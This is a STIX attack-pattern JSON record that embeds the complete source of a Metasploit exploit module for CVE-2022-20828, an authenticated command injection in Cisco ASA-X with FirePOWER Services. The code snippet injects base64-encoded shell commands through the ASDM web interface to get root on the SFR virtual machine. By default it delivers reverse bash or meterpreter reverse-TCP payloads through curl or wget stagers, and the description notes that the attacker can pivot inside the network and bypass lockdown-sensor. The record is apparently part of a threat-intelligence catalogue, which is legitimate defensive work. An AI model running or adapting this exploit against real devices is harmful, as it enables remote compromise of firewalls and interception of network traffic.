{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d44a49e5-b45e-47fe-814a-a632d290213b",
    "created": "2024-08-14T17:02:12.195216Z",
    "modified": "2024-08-14T17:02:12.19522Z",
    "name": "Cisco ASA-X with FirePOWER Services Authenticated Command Injection",
    "description": " This module exploits an authenticated command injection vulnerability affecting Cisco ASA-X with FirePOWER Services. This exploit is executed through the ASA's ASDM web server and lands in the FirePower Services SFR module's Linux virtual machine as the root user. Access to the virtual machine allows the attacker to pivot to the inside network, and access the outside network. Also, the SFR virtual machine is running snort on the traffic flowing through the ASA, so the attacker should have access to this diverted traffic as well.  This module requires ASDM credentials in order to traverse the ASDM interface. A similar attack can be performed via Cisco CLI (over SSH), although that isn't implemented here.  Finally, it's worth noting that this attack bypasses the affects of the `lockdown-sensor` command (e.g. the virtual machine's bash shell shouldn't be available but this attack makes it available). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_asax_sfr_rce.rb",
            "external_id": "cisco_asax_sfr_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-20828"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asasfr-cmd-inject-PE4GfdG"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2022/08/11/rapid7-discovered-vulnerabilities-in-cisco-asa-asdm-and-firepower-services-software/"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisco.com/c/en/us/td/docs/security/asa/quick_start/sfr/firepower-qsg.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cisco ASA-X with FirePOWER Services Authenticated Command Injection',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerability affecting\n          Cisco ASA-X with FirePOWER Services. This exploit is executed through the ASA's\n          ASDM web server and lands in the FirePower Services SFR module's Linux virtual\n          machine as the root user. Access to the virtual machine allows the attacker to\n          pivot to the inside network, and access the outside network. Also, the SFR\n          virtual machine is running snort on the traffic flowing through the ASA, so\n          the attacker should have access to this diverted traffic as well.\n\n          This module requires ASDM credentials in order to traverse the ASDM interface.\n          A similar attack can be performed via Cisco CLI (over SSH), although that isn't\n          implemented here.\n\n          Finally, it's worth noting that this attack bypasses the affects of the\n          `lockdown-sensor` command (e.g. the virtual machine's bash shell shouldn't be\n          available but this attack makes it available).\n\n          Cisco assigned this issue CVE-2022-20828. The issue affects all Cisco ASA that\n          support the ASA FirePOWER module (at least Cisco ASA-X with FirePOWER Service,\n          and Cisco ISA 3000). The vulnerability has been patched in ASA FirePOWER module\n          versions 6.2.3.19, 6.4.0.15, 6.6.7, and 7.0.21. The following versions will\n          receive no patch: 6.2.2 and earlier, 6.3.*, 6.5.*, and 6.7.*.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2022-20828' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asasfr-cmd-inject-PE4GfdG' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2022/08/11/rapid7-discovered-vulnerabilities-in-cisco-asa-asdm-and-firepower-services-software/' ],\n          [ 'URL', 'https://www.cisco.com/c/en/us/td/docs/security/asa/quick_start/sfr/firepower-qsg.html']\n        ],\n        'DisclosureDate' => '2022-06-22',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_X64,],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Shell Dropper',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X64,\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'curl', 'wget' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true,\n          'MeterpreterTryToFork' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('USERNAME', [true, 'Username to authenticate with', '']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', '']),\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/admin/exec/session+sfr+do+`id`'),\n      'headers' =>\n      {\n        'User-Agent' => 'ASDM/ Java/1',\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      }\n    })\n    return CheckCode::Unknown('The target did not respond to the check.') unless res\n    return CheckCode::Safe('Authentication failed.') if res.code == 401\n    return CheckCode::Unknown(\"Received unexpected HTTP status code: #{res.code}.\") unless res.code == 200\n\n    if res.body.include?('Invalid do command uid=0(root)')\n      return CheckCode::Vulnerable(\"Successfully executed the 'id' command.\")\n    end\n\n    CheckCode::Safe('The command injection does not appear to work.')\n  end\n\n  def execute_command(cmd, _opts = {})\n    # base64 encode the payload to work around bad characters and then uri encode\n    # the whole thing before yeeting it at the server\n    encoded_payload = Rex::Text.uri_encode(\"(base64 -d<<<#{Rex::Text.encode_base64(cmd)}|sh)&\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, \"/admin/exec/session+sfr+do+`#{encoded_payload}`\"),\n      'headers' =>\n      {\n        'User-Agent' => 'ASDM/ Java/1',\n        'Authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD'])\n      }\n    })\n\n    if res\n      fail_with(Failure::Unreachable, 'The target did not respond.') unless res\n      fail_with(Failure::NoAccess, 'Could not log in. Verify credentials.') if res.code == 401\n      fail_with(Failure::UnexpectedReply, \"Received unexpected HTTP status code: #{res.code}.\") unless res.code == 200\n    end\n\n    if session_created?\n      # technically speaking, bash can hold the connection open and skip all the res checks\n      # also passing the res checks doesn't actually mean that the target was exploited so\n      # check a session was created to get verification\n      print_good('Session created!')\n    else\n      fail_with(Failure::NotVulnerable, 'The exploit was thrown but not session was created.')\n    end\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-06-22",
    "x_mitre_platforms": [
        "linux'"
    ]
}